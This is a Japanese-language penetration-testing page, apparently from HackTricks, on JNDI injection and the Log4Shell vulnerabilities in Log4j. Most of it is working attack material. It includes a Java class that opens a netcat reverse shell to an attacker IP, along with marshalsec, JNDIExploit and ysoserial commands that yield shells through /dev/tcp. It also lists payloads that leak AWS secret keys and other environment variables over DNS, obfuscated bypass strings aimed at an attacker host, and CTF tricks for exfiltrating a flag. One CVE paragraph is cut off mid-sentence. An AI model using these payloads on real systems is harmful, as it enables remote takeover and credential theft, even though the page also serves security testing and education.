# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より速く修正できるようにしましょう。Intruderは攻撃対象の範囲を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリまで、クラウドシステム全体にわたる問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## 基本情報

JNDIは1990年代後半からJavaに存在しています。これは、**名前サービスを使用してディレクトリを介してデータを見つけるためのJavaプログラムを可能にするディレクトリサービス**です。名前サービスは値（バインディング）を関連付けるため、ディレクトリ内の参照を介して取得できます。

JNDIには、さまざまなディレクトリサービスを使用するための**サービスプロバイダインターフェース（SPI）**があります。JNDIの目的は、他のシステムからデータを非常に簡単に取得することです。さらに、Javaオブジェクトをリモートで取得することもできますが、そこで問題が発生します。

たとえば、**CORBA COS**（Common Object Service）、**Java RMI**（Remote Method Interface）レジストリ、**LDAP**には、それぞれSPIが存在します。

![](<../../.gitbook/assets/image (627).png>)

### JNDI Naming Reference

Javaオブジェクトを取得するためには、それらをシリアライズしてバイナリ表現を保存することができます。ただし、これが機能しない場合もあります（データが大きすぎるためなど）。\
Javaオブジェクトをより簡単に保存するために、**Naming References**が使用されます。\
Naming Referencesには2つのタイプがあります。

* **Reference Addresses**：これはオブジェクトのアドレスを示します（_rmi://server/ref_）。その後、**そのアドレスからオブジェクトが取得**されます。
* **Remote Factory**：この場合、JNDI参照には**リモートファクトリクラス**が指定されます。その後、JNDIアドレスに従ってリモートクラスがリモートファクトリから取得され、**クラスがダウンロードおよびロード**されます。

これは危険です。**攻撃者はシステムに任意のオブジェクトをロードし、任意のコードを実行**する可能性があるため、いくつかの保護策が存在します。

* **RMI**：**JDK 7u21**以降、デフォルトで`java.rmi.server.useCodeabseOnly = true`になっており、それ以外の場合はカスタムJavaオブジェクトをリモートでロードできます。さらに、保護が無効になっていても、**セキュリティマネージャ**が構成されているため、ロードできるものを設定できます。
* **LDAP**：**JDK 6u141、7u131、8u121**以降、デフォルトで`com.sun.jndi.ldap.object.trustURLCodebase = false`になっており、任意のJavaオブジェクトを実行できません。ただし、これを`true`に設定すると、実行でき、**セキュリティマネージャは強制されません**。
* **CORBA**：設定するプロパティはありませんが、**セキュリティマネージャは常に強制されます**。

さらに、JNDIリンクをたどる**Naming Manager**にはセキュリティマネージャや設定するプロパティがないため、常にオブジェクトを取得しようとします。

一般的に、保護策は十分ではありません。**ランダムなアドレスからのJNDIのロードに対する保護はなく**、RMI、LDAP、CORBAの保護策はバイパスされる可能性があります（設定による）。これにより、任意のJavaオブジェクトをロードしたり、既存のコンポーネントを悪用して任意のコードを実行するための**ガジェットとしてJavaオブジェクトをロード**したりすることができます。

JNDIを悪用するためのURLの例：

* _rmi://attacker-server/bar_
* _ldap://attacker-server/bar_
* _iiop://attacker-server/bar_

### JNDIの例

![](<../../.gitbook/assets/image (655) (1) (1).png>)

**`PROVIDER_URL`**を設定していても、lookupで異なるURLを指定することができます：`ctx.lookup("<attacker-controlled-url>")`。これが攻撃者が自身が制御するシステムから任意のオブジェクトをロードするために悪用する方法です。
### CORBA

**相互運用可能なオブジェクト参照（IOR）**は、CORBAまたはRMI-IIOPリファレンスであり、リモートCORBAサーバー上のオブジェクトを一意に識別します。IORはバイナリ形式またはバイナリの文字列16進数表現で存在することができます。\
その他の情報の中には、**タイプID**（インターフェースの一意の識別子）と**Codebase**（スタブクラスを取得するために使用されるリモートの場所）が含まれています。\
なお、**デフォルトではCORBAは悪用できません**。\
以下が必要です：

* **セキュリティマネージャーのインストール**
* 攻撃者が制御する**コードベースへの接続がセキュリティマネージャーによって許可される**必要があります。これを許可するためのさまざまな方法があります：
* ソケットの許可：`permissions java.net.SocketPermission "*:1098-1099", "connect";`
* すべてのファイルを読み取るためのファイルの許可：`permission java.io.FilePermission "<<ALL FILES>>", "read";`
* 攻撃者がエクスプロイト（クラスまたはZIPアーカイブ）をアップロードできるフォルダを読み取るためのファイルの許可

ベンダーのポリシーでは、これをデフォルトで許可している場合があります。

### RMI

前の**JNDI Naming Referenceセクション**で示されているように、デフォルトではRMIでは**任意のJavaクラスをダウンロードすることはできません**。さらに、できたとしても、セキュリティマネージャーポリシーを**バイパスする必要があります**（前のセクションではこれがCORBAで可能であることを学びました）。

### LDAP

まず、**検索**と**ルックアップ**を区別する必要があります。\
**検索**は、`ldap://localhost:389/o=JNDITutorial`のようなURLを使用して、LDAPサーバーからJNDITutorialオブジェクトを見つけてその属性を取得します。\
**ルックアップ**は、名前にバインドされている**何でも取得**するための**ネーミングサービス**向けです。

LDAP検索が**SearchControls.setReturningObjFlag()を`true`で呼び出された場合、返されたオブジェクトは再構築されます**。

したがって、これらのオプションを攻撃する方法はいくつかあります。\
**攻撃者は、LDAPレコードにペイロードを挿入してシステムで実行される**可能性がある（LDAPサーバーへのアクセス権がある場合、多数のマシンを侵害するのに非常に便利です）。これを悪用する別の方法は、LDAP検索で**MitM攻撃を実行する**ことです。

アプリケーションがJNDI LDAP URLを解決できる場合、検索されるLDAPを制御でき、エクスプロイト（log4shell）を送り返すことができます。

#### シリアライゼーションのエクスプロイト

![](<../../.gitbook/assets/image (654) (1) (1) (1).png>)

**エクスプロイトはシリアライズされ**、デシリアライズされます。\
`trustURLCodebase`が`true`の場合、攻撃者はコードベースに独自のクラスを提供できます。そうでない場合は、クラスパス内のガジェットを悪用する必要があります。

#### JNDIリファレンスのエクスプロイト

このLDAPを攻撃するのは**JavaFactoryリファレンス**を使用する方が簡単です：

![](<../../.gitbook/assets/image (660) (1) (1).png>)

## Log4Shell脆弱性

この脆弱性は、Log4jが[**特殊な構文**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution)をサポートしているためにLog4jに導入されています。この構文は`${prefix:name}`の形式であり、`prefix`はさまざまな[**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html)の1つであり、`name`は評価されるべきです。たとえば、`${java:version}`は現在実行中のJavaのバージョンです。

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313)では、次のように`jndi` Lookupが追加されました。「JndiLookupはJNDIを介して変数を取得することを可能にします。デフォルトでは、キーは`java:comp/env/`で接頭辞が付けられますが、キーに**":"が含まれている場合は接頭辞は追加されません**。」

キーに**":"が含まれている**場合、`${jndi:ldap://example.com/a}`のように、**接頭辞はなく**、**LDAPサーバーがオブジェクトに対してクエリを実行**します。これらのLookupsは、Log4jの設定だけでなく、ログが記録されるときにも使用できます。

したがって、**ユーザーが制御する情報を処理する脆弱なバージョンのLog4jを取得するためには、それだけが必要です**。そして、これはJavaアプリケーションが情報を記録するために広く使用されているライブラリであるため（インターネットに面したアプリケーションも含まれます）、log4jは例えばUser-AgentのようなHTTPヘッダーを受信したときにログを記録するために使用されるだけでなく、開発者が指定した任意の入力とデータをログに記録するために使用されます。

## Log4Shell CVE

* [**CVE-2021-44228**](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Critical]**: オリジナルの「Log4Shell」脆弱性は、[信頼されていないデシリアライゼーション](https://cwe.mitre.org/data/definitions/502.html)の欠陥です。重大度はクリティカルで、この脆弱性は[CVSS](https://www.first.org/cvss/)スケールで10点を獲得し、認証されていない攻撃者にリモートコード実行（RCE）の機能を与え、完全なシステム乗っ取りを可能にします。\
\
11月24日にアリババクラウドセキュリティチームのChen Zhaojun氏がApacheに報告したCVE-2021-44228は、Apache Struts2、Apache Solr、Apache Druid、Apache Flinkなど、複数のApacheフレームワークのデフォルト構成に影響を与えます。\
\
最も危険な脆弱性であるこの脆弱性は、[log4j-core](https://search.maven.org/artifact/org.apache.logging.log4j/log4j-core)コンポーネントに存在し、2.xバージョンの2.0-beta9から2.14.1までの範囲に限定されます。Log
\_\_"Log4j 2.16.0は、メッセージのルックアップパターンのサポートを削除し、デフォルトでJNDI機能を無効にすることで、この問題を修正しています"、とNVDアドバイザリーは述べています。2.12.1ブランチのユーザーには、修正が2.12.2にバックポートされました。\\
* [**CVE-2021-4104**](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[High]**: Log4j 2.xのバージョンが脆弱であると言いましたが、**Log4j 1.x**はどうでしょうか？\
\
以前は安全と考えられていたLog4j 1.xにもLog4Shellが潜む方法が見つかりました。具体的には、**\_JMSAppender**\_\*\*クラスを使用したLog4j 1.xインスタンスの非デフォルトの設定も、信頼できない逆シリアル化の欠陥に対して脆弱になります。\*\*\
\
CVE-2021-44228のより軽度なバリエーションですが、これは[log4j:log4j](https://search.maven.org/artifact/log4j/log4j)および[org.apache.log4j:log4j](https://mvnrepository.com/artifact/org.apache.log4j/log4j)コンポーネントのすべてのバージョンに影響します。これらは[エンドオブライフ](https://logging.apache.org/log4j/1.2/)のバージョンであり、**1.xブランチの修正はどこにも存在しないため**、_log4j-core_ 2.17.0にアップグレードする必要があります（おそらく1.0は脆弱ではありません）。\\
* [**CVE-2021-42550**](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[Moderate]:** これは**Logbackログフレームワーク**の脆弱性です。Log4j 1.xライブラリの後継であるLogbackは、「log4j 1.xの続きから始まる」と主張しています。\
\
先週までは、Logbackも「log4j 2.xとは関係なく、その脆弱性を共有しない」と[自慢していました](https://archive.md/QkzIy)。\
\
しかし、**CVE-2021-4104**がLog4j 1.xにも影響を与えることが判明し、Logbackへの潜在的な影響が[評価されました](https://jira.qos.ch/browse/LOGBACK-1591)。この軽度な脆弱性に対処するために、新しいLogbackバージョンである1.3.0-alpha11と1.2.9が[リリースされました](https://search.maven.org/artifact/ch.qos.logback/logback-classic)。\\
* **CVE-2021-45105** **\[High]**: **Log4j 2.16.0**は、DoSの脆弱性に対して「High」と評価されました。Apacheは後に、このCVEを修正するlog4j 2.17.0バージョンを**リリースしました**。この開発の詳細については、BleepingComputerの[最新のレポート](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/)で提供されています。
* [**CVE-2021-44832**](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/): この新しいCVEは、log4jのバージョン2.17に影響を与えます。この脆弱性は、log4jの設定ファイルを制御する攻撃者が必要であり、設定されたJDBCAppenderでJDNI URLを指定することが可能です。この脆弱性と攻撃についての情報は、[**こちらの情報**](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)を参照してください。

## Log4Shellの悪用

### 発見

この脆弱性は非常に簡単に発見できます。なぜなら、ペイロードで指定したアドレスに対して少なくとも**DNSリクエスト**が送信されるからです。したがって、次のようなペイロードがあります：

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}`（[canarytokens.com](https://canarytokens.org/generate)を使用）
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}`（[interactsh](https://github.com/projectdiscovery/interactsh)を使用）
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}`（Burp Suiteを使用）
* `${jndi:ldap://2j4ayo.dnslog.cn}`（[dnslog](http://dnslog.cn)を使用）
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}`（[huntress](https://log4shell.huntress.com)を使用）

**DNSリクエストが受信されたからといって、アプリケーションが悪用可能**（または脆弱）であるということではありません。悪用を試みる必要があります。

{% hint style="info" %}
バージョン2.15を**悪用するには、localhostのチェックバイパス**を追加する必要があります：${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **ローカルの発見**

次のコマンドを使用して、ライブラリの**ローカルの脆弱なバージョン**を検索します：
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **検証**

以前にリストアップされたいくつかのプラットフォームでは、リクエスト時にログに記録される変数データを挿入することができます。\
これは2つのことに非常に役立ちます。

* 脆弱性を**検証**するため
* 脆弱性を悪用して情報を**外部流出**するため

例えば、次のようなリクエストを送信することができます:\
`${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** ともし環境変数の値がDNSリクエストで受信された場合、アプリケーションは脆弱性があることがわかります。

他にも漏洩を試みることができる情報は以下の通りです:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE情報

{% hint style="info" %}
**JDKのバージョンが6u141、7u131、8u121よりも高いホストは、LDAPクラスの読み込みベクトルに対して保護されますが、逆シリアル化ベクトルには保護されません**。これは、`com.sun.jndi.ldap.object.trustURLCodebase`がデフォルトで無効化されているため、JNDIがLDAPを使用してリモートコードベースを読み込むことができないためです。ただし、逆シリアル化と変数の漏洩は依然として可能です。\
これは、**上記のバージョンを悪用するためには、Javaアプリケーション上に存在する信頼されたガジェットを悪用する必要がある**ことを意味します（例えば、ysoserialやJNDIExploitを使用）。ただし、より低いバージョンを悪用するには、任意のクラスを読み込んで実行させることができるため、攻撃が容易になります。

**詳細な情報**（RMIおよびCORBAベクトルの制限など）については、**前のJNDI Naming Referenceセクション**または[https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)を参照してください。
{% endhint %}

### RCE - カスタムペイロードを使用したMarshalsec

_このトリックは完全に**THMボックス**から取得されました:_ [_**https://tryhackme.com/room/solar**_](https://tryhackme.com/room/solar)\_\_

この攻撃では、ツール[**marshalsec**](https://github.com/mbechler/marshalsec)（[**ここからjarバージョンをダウンロード**](https://github.com/RandomRobbieBF/marshalsec-jar)）を使用して、LDAPリファラルサーバーを作成し、接続をセカンダリのHTTPサーバーにリダイレクトし、そこで攻撃が提供されます。
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
被害者に逆シェルを送信するコードを読み込ませたいので、以下の内容でExploit.javaという名前のJavaファイルを作成します。

{% code title="" %}
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
{% endcode %}

**クラスファイル**を作成するには、`javac Exploit.java -source 8 -target 8`を実行し、その後、クラスファイルが作成されたディレクトリで**HTTPサーバー**を実行します：`python3 -m http.server`。\
**marshalsecのLDAPサーバーは、このHTTPサーバーを指すように設定する必要があります**。\
その後、以下のようなペイロードを送信することで、**脆弱なWebサーバーにエクスプロイトクラスを実行させる**ことができます：
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
### RCE - **JNDIExploit**

{% hint style="info" %}
JavaがLDAPを使用してリモートコードベースをロードするように設定されていない場合、このカスタムエクスプロイトは機能しません。その場合、信頼されたクラスを悪用して任意のコードを実行する必要があります。
{% endhint %}

この例では、ポート8080でこの**脆弱なWebサーバー（log4shell）**を実行できます：[https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app)（_READMEに実行方法が記載されています_）。この脆弱なアプリは、HTTPリクエストヘッダーのコンテンツ_X-Api-Version_を脆弱なバージョンのlog4shellでログに記録しています。

次に、**JNDIExploit**のjarファイルをダウンロードし、次のコマンドで実行します：
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
コードを数分読んだ後、_com.feihong.ldap.LdapServer_と_com.feihong.ldap.HTTPServer_では、**LDAPサーバーとHTTPサーバーが作成される**方法がわかります。LDAPサーバーはどのペイロードを提供する必要があるかを理解し、被害者をHTTPサーバーにリダイレクトし、そこでエクスプロイトを提供します。\
_com.feihong.ldap.gadgets_では、望ましいアクション（任意のコードを実行する可能性がある）を実行するために使用できる**特定のガジェット**が見つかります。そして、_com.feihong.ldap.template_では、エクスプロイトを**生成するための異なるテンプレートクラス**が見られます。

**`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**で利用可能なすべてのエクスプロイトを確認できます。いくつかの便利なものは次のとおりです：
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
したがって、この例では、すでに脆弱なDockerアプリが実行されているとします。攻撃するためには、以下の手順を実行します。
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
攻撃を送信すると、**JNDIExploit-1.2-SNAPSHOT.jar**を実行したターミナルにいくつかの出力が表示されます。

他の攻撃オプションを確認するために、`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`をチェックすることを忘れないでください。また、LDAPとHTTPサーバーのポートを変更することもできます。

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

前の攻撃と同様に、この脆弱性を悪用するために[**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit)を使用することができます。\
被害者に送信するためのURLを生成するには、次のコマンドを実行します：
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_このカスタム生成されたJavaオブジェクトを使用した攻撃は、**THMソーラールーム**のようなラボで動作します。ただし、一般的には動作しません（デフォルトではJavaはLDAPを使用してリモートコードベースをロードするように設定されていないためだと思われます）。これは、信頼されたクラスを悪用して任意のコードを実行するものではないためです。_

### RCE - ysoserial & JNDI-Exploit-Kit

このオプションは、**指定されたクラスのみを信頼し、すべてのクラスを信頼しないように構成されたJavaバージョン**を攻撃するのに非常に便利です。したがって、**ysoserial**を使用して、**信頼されたクラスのシリアライズ**を生成し、それをガジェットとして使用して**任意のコードを実行**することができます（_ysoserialによって悪用される信頼されたクラスは、エクスプロイトが機能するために被害者のJavaプログラムで使用される必要があります_）。

**ysoserial**または[**ysoserial-modified**](https://github.com/pimps/ysoserial-modified)を使用すると、JNDIによってダウンロードされるデシリアライズエクスプロイトを作成できます。
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
[**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit)を使用して、脆弱なマシンからの接続を待つための**JNDIリンク**を生成します。JNDI-Exploit-Kitによって自動的に生成される**さまざまなエクスプロイト**またはあなた自身やysoserialによって生成された**独自の逆シリアル化ペイロード**を提供することもできます。
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

今、生成されたJNDIリンクを使用して脆弱性を悪用し、**`${ldap://10.10.14.10:1389/generated}`**という形で脆弱なバージョンのlog4jに**逆シェル**を取得することが容易になりました。

### バイパス方法
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ı}}:ldap://...} //Notice the unicode "i"
```
### 自動スキャナー

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - 脆弱なライブラリをローカルで検出する

### テスト用のラボ

* [**LogForge HTBマシン**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar room**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Log4Shellの脆弱性を悪用した後

この[**CTFの解説記事**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)では、**Log4J**の一部の機能を**悪用**することが**可能**である方法が詳しく説明されています。

Log4jの[**セキュリティページ**](https://logging.apache.org/log4j/2.x/security.html)には興味深い文がいくつかあります：

> バージョン2.16.0（Java 8用）からは、**メッセージルックアップ機能が完全に削除**されました。**設定内のルックアップは引き続き機能します**。さらに、Log4jはデフォルトでJNDIへのアクセスを無効にします。設定内のJNDIルックアップを有効にする必要があります。

> バージョン2.17.0（およびJava 7およびJava 6用の2.12.3および2.3.1）からは、**設定内のルックアップ文字列のみが再帰的に展開**されます。他の使用方法では、トップレベルのルックアップのみが解決され、ネストされたルックアップは解決されません。

これは、デフォルトでは**`jndi`の脆弱性を使用することはできない**ことを意味します。さらに、**再帰的なルックアップ**を実行するには、それらを設定する必要があります。

例えば、このCTFでは、次のようにファイルlog4j2.xmlで設定されていました：
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Env Lookups

このCTFでは、攻撃者は`${sys:cmd}`の値を制御し、環境変数からフラグを外部に持ち出す必要がありました。[**前のペイロード**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification)のページで見られるように、**`${env:FLAG}`**などの異なる方法で環境変数にアクセスすることができます。このCTFではこれは役に立ちませんでしたが、他の現実のシナリオでは役に立つかもしれません。

### Exfiltration in Exceptions

CTFでは、log4Jを使用してJavaアプリケーションのstderrにアクセスすることはできませんでしたが、Log4Jの例外はstdoutに送信され、Pythonアプリケーションで表示されました。これは、例外をトリガーすることでコンテンツにアクセスできることを意味します。フラグを外部に持ち出すための例外は次のとおりです：`${java:${env:FLAG}}`。これは、`${java:CTF{blahblah}}`が存在せず、フラグの値が表示される例外が表示されるため機能します。

![](<../../.gitbook/assets/image (157).png>)

### Conversion Patterns Exceptions

言及するだけですが、新しい[**変換パターン**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout)を注入し、`stdout`にログを記録する例外をトリガーすることもできます。例えば：

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

これは、エラーメッセージ内の日付を外部に持ち出すのには役に立ちませんでした。なぜなら、変換パターンよりもルックアップが先に解決されなかったからですが、検出などの他の用途には役立つかもしれません。

### Conversion Patterns Regexes

ただし、正規表現をサポートするいくつかの変換パターンを使用して、正規表現を使用してルックアップから情報を外部に持ち出すことができます。これは、**バイナリサーチ**または**時間ベース**の動作を濫用することができます。

* **例外メッセージを使用したバイナリサーチ**

変換パターン**`%replace`**は、**文字列**内の**コンテンツ**を**正規表現**を使用して**置換**するために使用できます。次のように機能します：`replace{pattern}{regex}{substitution}`\
この動作を濫用することで、文字列内に正規表現が一致する場合には例外をトリガーし（一致しない場合は例外をトリガーしない）、次のようにします：
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **タイムベース**

前のセクションで述べたように、**`%replace`**は**正規表現**をサポートしています。したがって、[**ReDoSページ**](../regular-expression-denial-of-service-redos.md)のペイロードを使用して、フラグが見つかった場合に**タイムアウト**を引き起こすことが可能です。\
たとえば、`%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}`のようなペイロードは、そのCTFで**タイムアウト**を引き起こします。

この[**解説記事**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)では、ReDoS攻撃ではなく、**増幅攻撃**を使用して応答の時間差を引き起こしました：

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> フラグが`flagGuess`で始まる場合、フラグ全体が29個の`#`で置き換えられます（この文字を使用したのは、おそらくフラグの一部ではないためです）。**その29個の`#`のそれぞれが54個の`#`で置き換えられます**。このプロセスは**6回繰り返され、合計で` 29*54*54^6* =`` `` `**`96816014208`  `#`**が生成されます！**
>
> これほど多くの`#`を置き換えると、Flaskアプリケーションの10秒タイムアウトが発生し、ユーザーにHTTPステータスコード500が送信されます（フラグが`flagGuess`で始まらない場合、非500のステータスコードが受信されます）

## 参考文献

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
